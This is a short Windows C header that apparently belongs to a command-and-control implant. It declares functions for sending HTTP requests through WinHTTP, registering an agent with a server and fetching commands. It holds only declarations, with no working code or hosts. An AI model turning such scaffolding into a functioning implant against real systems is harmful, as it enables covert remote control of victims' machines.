#pragma once
#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "package.h"
#include "implant.h"

HANDLE PerformRequest(pAgent agent, LPCWSTR UserAgent, LPCWSTR HttpEndpoint, LPCWSTR pswzServerName, LPVOID DataBuff, DWORD dwDataLen, LPCWSTR pswzRequestHeaders);
BOOL RegisterAgent(pAgent agent);
BOOL GetCommand();
